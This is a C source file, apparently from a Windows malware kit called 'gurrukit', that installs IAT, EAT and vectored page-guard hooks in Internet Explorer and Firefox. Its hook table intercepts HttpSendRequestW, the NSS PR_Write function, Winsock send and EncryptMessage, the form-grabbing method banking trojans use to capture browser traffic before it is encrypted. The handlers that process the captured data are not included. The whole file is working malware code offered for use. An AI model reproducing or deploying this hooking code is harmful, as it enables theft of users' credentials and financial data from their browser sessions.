#include <windows.h>
#include <winternl.h>
//#include <security.h>
#include "include/gurrukit.h"
#include "include/sys.h"
#include "include/hook.h"
#include "include/external/ldasm.h"
#include "include/hooking.h"





BOOL EAT_Hooked = FALSE;
BOOL IAT_Hooked = FALSE;
BOOL VEH_Hooked = TRUE;

HOOKS HooksList[] = {
	{"user32.dll", "MessageBoxA", hkMessageBoxA, &orgMessageBoxA, 1, 1, 0, 0},
	{"wininet.dll", "HttpSendRequestW", hkHttpSendRequestW, &orgHttpSendRequestW, 1, 1, 0, 0},
	{ "nss3.dll", "PR_Write", hkPR_Write, &orgPR_Write, 1, 1, 0, 0},
	{ "nss3.dll", "send", hksend, &orgsend, 1, 1, 0, 0 },
	{ "wsock32.dll", "send", hksend, &orgsend, 1, 1, 0, 0 },
	{ "ws2_32.dll", "send", hksend, &orgsend, 1, 1, 0, 0},
	{ "secur32.dll", "EncryptMessage", hkEncryptMessage, &orgEncryptMessage, 1, 1, 0, 0 },
	//{ "kernel32.dll", "GetProcAddress", hkGetProcAddress, &orgGetProcAddress, 1, 0, 0, 0 },
	{NULL, NULL, NULL, NULL}
};

const char *HookProcess[] = { "iexplore.exe", "firefox.exe", NULL };



int HookingDefault(VOID) {
	DWORD dwCount = 0;
	MEMORY_BASIC_INFORMATION memInfo;
	DWORD old;

	VirtualQuery(GetModuleHandleA(NULL), &memInfo, sizeof(MEMORY_BASIC_INFORMATION));
	VirtualProtect(memInfo.BaseAddress, memInfo.RegionSize, 0x40, &old);

	AddVectoredExceptionHandler(TRUE, (PVECTORED_EXCEPTION_HANDLER)HookVEHCallBack);

	while (HooksList[dwCount].iAPIName != NULL) {
		if ((*HooksList[dwCount].orgFunc = GetProcAddress(GetModuleHandleA(HooksList[dwCount].iDLLName), HooksList[dwCount].iAPIName)) != NULL) {
			*HooksList[dwCount].orgFunc++; *HooksList[dwCount].orgFunc++;
			HookVEH((PDWORD)(PVOID)GetProcAddress(GetModuleHandleA(HooksList[dwCount].iDLLName), HooksList[dwCount].iAPIName), HookVEHCallBack);

			//HookIAT(HooksList[uCount].iDLLName, HooksList[uCount].iAPIName, ((void *)HooksList[uCount].hkFunc));
			//HookEAT(LoadLibraryA(HooksList[uCount].iDLLName), HooksList[uCount].iAPIName, ((void *)HooksList[uCount].hkFunc));
		}
		dwCount++;
	}

	

	return(0);
}

int HookIAT(CHAR *dllName, CHAR *funcName, LPVOID *hkFunc) { // not found injected in remote process
	PIMAGE_DOS_HEADER pDOSHeader;
#ifdef _WIN64
	PIMAGE_NT_HEADERS64 pNTHeader;
	PIMAGE_THUNK_DATA64 pThunk, pOGThunk;
#else
	PIMAGE_NT_HEADERS32 pNTHeader;
	PIMAGE_THUNK_DATA32 pThunk, pOGThunk;
#endif
	PIMAGE_SECTION_HEADER pSectionHeader;
	PIMAGE_DATA_DIRECTORY pDataDirectory;
	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor;
	PIMAGE_IMPORT_BY_NAME pImportByName;
	unsigned long	dwImageBase, dwImportTable, dwApiOffset, dwNameOffset,
					dwRvaSize, dwHint, dwThunkTrace, dwImportSize;
	char *name;
	void *api;
	unsigned int oldProtect;
	MEMORY_BASIC_INFORMATION memInfo;
	unsigned long hMemory = sysGetImageBase();


	pDOSHeader = (PIMAGE_DOS_HEADER)hMemory;

	if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return(-1);

	pNTHeader = (PIMAGE_NT_HEADERS)((unsigned long)hMemory + pDOSHeader->e_lfanew);

	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
		return(-1);



	dwImageBase = (unsigned long)pNTHeader->OptionalHeader.ImageBase;
	//image_len = pNTHeader->OptionalHeader.SizeOfImage;
	dwRvaSize = pNTHeader->OptionalHeader.NumberOfRvaAndSizes;
	pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(dwImageBase + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	dwImportSize = (DWORD)(dwImageBase + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);

	dwImportTable = pImportDescriptor->OriginalFirstThunk;



	while (pImportDescriptor->Name != 0) {
		name = dwImageBase + pImportDescriptor->Name;
		

		pOGThunk = dwImageBase + pImportDescriptor->OriginalFirstThunk;
		pThunk = dwImageBase + pImportDescriptor->FirstThunk;
		dwThunkTrace = dwImageBase + pImportDescriptor->FirstThunk;

		while ((pThunk->u1.AddressOfData) != 0x0000FFFF && (pThunk->u1.Ordinal) != 0) {
			dwApiOffset = pThunk->u1.Function;
			api = (void *)dwApiOffset;
			name = dwImageBase + pOGThunk->u1.ForwarderString + 2;

			if (lstrlen(name)>0) {
				if (lstrcmpA(name, funcName) == 0x00) {
					VirtualQuery(pThunk, &memInfo, sizeof(memInfo));
					if(VirtualProtect(memInfo.BaseAddress, memInfo.RegionSize, 0x40, &oldProtect)==FALSE) return NULL;
					//pThunk->u1.Function = hkFunc;
					*(unsigned int *)dwThunkTrace = hkFunc;
					FlushInstructionCache(GetCurrentProcess(), memInfo.BaseAddress, memInfo.RegionSize); // Test added and no test
					VirtualProtect(memInfo.BaseAddress, memInfo.RegionSize, oldProtect, &oldProtect);
					return(1);
				}
			}
			pThunk++;
			pOGThunk++;
			dwThunkTrace += sizeof(pThunk);
		}



		pImportDescriptor++;
		dwImportSize -= sizeof(PIMAGE_IMPORT_DESCRIPTOR);

	}


	return(0);
}


DWORD HookEAT(HMODULE hMod, CHAR *szFuncName, LPVOID hkFunc) {
	DWORD	dwEATOffset, dwEATFuncPTR, oldProtect, dwCount = 0;
	DWORD *dwNames, *dwFunctions;
	WORD *wOrdinals;
	MEMORY_BASIC_INFORMATION memInfo;
	PIMAGE_DOS_HEADER lpDOS = (PIMAGE_DOS_HEADER)hMod;
	PIMAGE_NT_HEADERS lpNT;
	PIMAGE_EXPORT_DIRECTORY lpEXPORT;
	LPDWORD lpdFuncList;
	char *ptrName;

	if (hMod == NULL) return NULL;
	if (lpDOS->e_magic != IMAGE_DOS_SIGNATURE)	return NULL;

	lpNT = ((PIMAGE_NT_HEADERS)((DWORD)(lpDOS) + (DWORD)(lpDOS->e_lfanew)));
	if (lpNT->Signature != IMAGE_NT_SIGNATURE)		return NULL;

	dwEATOffset = lpNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	lpEXPORT = (PIMAGE_EXPORT_DIRECTORY)((DWORD)dwEATOffset + (DWORD)hMod);



	for (dwCount = 0; dwCount < lpEXPORT->NumberOfFunctions; dwCount++) {
		dwNames = (DWORD *)((DWORD)hMod + (DWORD)lpEXPORT->AddressOfNames + (dwCount*sizeof(DWORD)));
		ptrName = (char *)((DWORD)hMod + *dwNames);
		if (lstrcmpiA(ptrName, szFuncName) == 0x00) {
			wOrdinals = (WORD *)((DWORD)hMod + (DWORD)lpEXPORT->AddressOfNameOrdinals + (dwCount*sizeof(WORD)));
			dwFunctions = (DWORD *)((DWORD)hMod + (DWORD)(lpEXPORT->AddressOfFunctions)) + (sizeof(DWORD)**wOrdinals);
			lpdFuncList = (LPDWORD)(hMod + lpEXPORT->AddressOfFunctions);
			VirtualQuery(((DWORD)hMod + (DWORD)dwEATOffset), &memInfo, sizeof(memInfo));
			if (VirtualProtect(memInfo.BaseAddress, memInfo.RegionSize, 0x40, &oldProtect) == FALSE) return NULL;
			DWORD *pFunc = (DWORD *)&lpdFuncList[dwCount];
			*pFunc = (DWORD)((DWORD)hkFunc - (DWORD)hMod);
			*dwFunctions = (DWORD)((DWORD)hkFunc - (DWORD)hMod);
			VirtualProtect(memInfo.BaseAddress, memInfo.RegionSize, oldProtect, &oldProtect);
			return(1);
		}
		
		//dwCount++;
	}
	/*
	for (dwCount = 0; dwCount < lpEXPORT->NumberOfFunctions; dwCount++) {
		
	}
	*/

	return(0);
}

//Vectored PageGuard Hooking
DWORD HookVEH(PDWORD pExceptionPoint, PVECTORED_EXCEPTION_HANDLER pvExceptionCallBack) { //PDWORD pExceptionPoint, PVECTORED_EXCEPTION_HANDLER pExceptionCallBack, PDWORD hkFunc) {
	DWORD dwOld;
	
	if (pExceptionPoint == NULL)	return(0);


	VirtualProtect(pExceptionPoint, 1, PAGE_EXECUTE | PAGE_GUARD, &dwOld);



	return(0);
}


DWORD WINAPI HookVEHCallBack(EXCEPTION_POINTERS *pExceptionInfo) {
	DWORD dwCount = 0;
	
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
		while (HooksList[dwCount].iAPIName != NULL) {
			if (pExceptionInfo->ExceptionRecord->ExceptionAddress == GetProcAddress(GetModuleHandleA(HooksList[dwCount].iDLLName), HooksList[dwCount].iAPIName)) {
				#ifdef _WIN64
					pExceptionInfo->ContextRecord->Rip = HooksList[dwCount].hkFunc;
				#else
					pExceptionInfo->ContextRecord->Eip = HooksList[dwCount].hkFunc;
				#endif
				//DWORD a = pExceptionInfo->ContextRecord->Ebp;
				return(EXCEPTION_CONTINUE_EXECUTION);
			}

			dwCount++;
		}
		pExceptionInfo->ContextRecord->EFlags |= 0x100;
		return(EXCEPTION_CONTINUE_EXECUTION);

	}
	else if (pExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
		DWORD dwOld;
		DWORD dwCount = 0;

		while (HooksList[dwCount].iAPIName != NULL) {
			if (HooksList[dwCount].orgFunc!=NULL)
				VirtualProtect(GetProcAddress(GetModuleHandleA(HooksList[dwCount].iDLLName), HooksList[dwCount].iAPIName), 1, PAGE_EXECUTE | PAGE_GUARD, &dwOld);
			dwCount++;
		}
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return(EXCEPTION_CONTINUE_SEARCH);
}

